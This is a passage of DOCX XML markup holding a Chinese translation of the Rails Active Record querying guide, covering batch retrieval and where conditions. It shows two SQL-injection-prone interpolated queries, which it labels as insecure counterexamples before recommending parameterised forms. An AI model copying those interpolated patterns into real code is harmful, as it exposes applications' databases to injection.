    <w:p w14:paraId="776E94F6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">默认情况下，我们根据主键的递增顺序取数据，因为主键肯定是一个正整数。当你不需要低于某个 ID 值以下的记录时， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:start</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 这个参数让你可以指定开始的 ID 值，比如说：如果你想继续一个中断的处理进程，你就可以提供你最后一个保存的记录 ID 来实现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6855A95C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>比如说： 只对记录 ID 大于 2000 的用户发送新闻信件（ newsletters ），并且按照每组 5000 条记录查询：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7319"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="2222C379" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="394F2256" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>User.find_each(:start</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 2000, :batch_size</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 5000) do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|user|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BE51702" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  NewLetter.weekly_deliver(user)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0EB0726F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2AB1C6CF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">另外一个例子是如果你想多个机器（ workers ）共同执行一个查询。你可以在每个机器（ worker ）上设置 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:start</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 属性来各自处理 10000 条数据。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0124C27A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 可以让你定义与该记录一起加载的关联记录（ associations ）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A457C89" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56C79924" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 很像，因为它们都是按组检索记录的。不同点在于 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 将整组数据作为一个 model 数组传给 block 语句块，而不是分开传递。下面的例子一次性将最多 1000 个 invoice 记录作为一个数组传递给 block 语句块，最后语句块包含所有剩下的 invoice 记录。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7871"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="115A65E6" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="424AEBBF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># 一次性传递 1000 个 invoices 记录给 add_invoices 方法。</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4F42C6EB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Invoice.find_in_batches(:include</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :invoice_lines) do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|invoices|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FD5F89E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  export.add_invoices(invoices)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5EAF97AB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5403D5CF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:include</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 可以让你定义与该记录一起加载的关联记录（ associations ）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="322E5B50" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.3.2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>的参数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3771E23B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法也像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_each</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法一样接受 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:batch_size</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:start</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 这两个参数，同时也接受大部分普通 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法的参数，除了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:limit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 这两个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>find_in_batches</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 内部实现时已经使用了的参数。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2700C6EE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63DC559A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 方法让你可以限制返回的结果集，它代表了 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>where</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 部分。条件可以是一个字符串、一个数组或者是一个映射表。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16CCD72E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1 仅含有字符串的条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B67B835" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你想在普通查找方法里面加上条件表达式，那你可以直接这样写， </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.where("orders_count = '2'")</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。它会返回所有的 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>orders_counts</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 为 2 的 client 记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6512A171" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">直接用字符串构造你的条件表达式可能会让你遭受到 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 注入攻击。比如说： </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Client.where("first_name LIKE '%#{params[:first_name]}'")</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 就是不安全的。请看下一节如何使用数组来更好地构造条件表达式。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16C8643D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2 数组式条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BA3920" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>假如数字会发生变化或者从其它地方传入，那该怎么办呢？那方法可能会写成如下形式：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5976"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="41579B2D" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="232E469C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1704357104"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where("orders_count =?", params[:orders])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58E8D248" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Active Record 会先检查第一个元素，并用后面的元素代替 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(?)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 中的问号。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76D7F230" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>如果你需要多个条件表达式：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3BBBD71E" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="55731A11" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="829173119"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where("orders_count = ? AND locked = ?", params[:orders], false)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="303864AE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">在这个例子中，第一个问号会被 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>params[:orders]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 替代，第二个问号会被 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 的的等价值代替，具体值取决于数据库适配器。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E7B2553" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>所以，下面这种写法</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0B8F2D8A" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5553D13E" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="950208801"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where("orders_count = ?", params[:orders])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0ED2BDD5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>比这种写法要好。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6096"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="594606A8" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45C95EC8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="37556192"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where("orders_count = #{params[:orders]}")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6E7A395D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">因为它是变量安全的。如果你直接把变量写在条件表达式里面，那数据库适配器会直接把变量传递给数据库 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>as-is</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 。这就意味着数据库可能得到某些来自于某个恶意用户的不安全的变量。如果你这样做了，那你的数据库就危险了，因为一旦某个用户发现了他可以入侵你的数据库，他就可以对它做任何事。所以千万不要直接把变量写在条件表达式里面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61F798EC" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.1 条件表达式中的占位符</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72B2848D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">就像 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>(?)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 代替变量一样，你也可以在数组形式的条件表达式里面使用键值对：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="707AB9FC" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="459407DD" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">Client.where("created_at &gt;= :start_date AND created_at &lt;= :end_date", </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5AFE7FD3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  {:start_date</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; params[:start_date], :end_date</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; params[:end_date]})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2F3DEDD0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>当你有一大堆变量时，这样的写法更有可读性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75D90260" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>2.2.2 数列式条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="213D1776" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">如果你要查找一个表中的一段连续的记录（比如说，在确定的一段时间内创建的用户），你可以在原始 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>SQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 语句中直接使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 配合条件表达式来达到目的。如果知道两个日期值，你也可以这样查找这些连续的记录。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="54931FC7" w14:textId="77777777" w:rsidTr="00DE0EFC">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3FB9C3A3" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="743769364"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.where(:created_at</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; (params[:start_date].to_date)..(params[:end_date].to_date))</w:t>
            </w:r>
          </w:p>
        </w:tc>
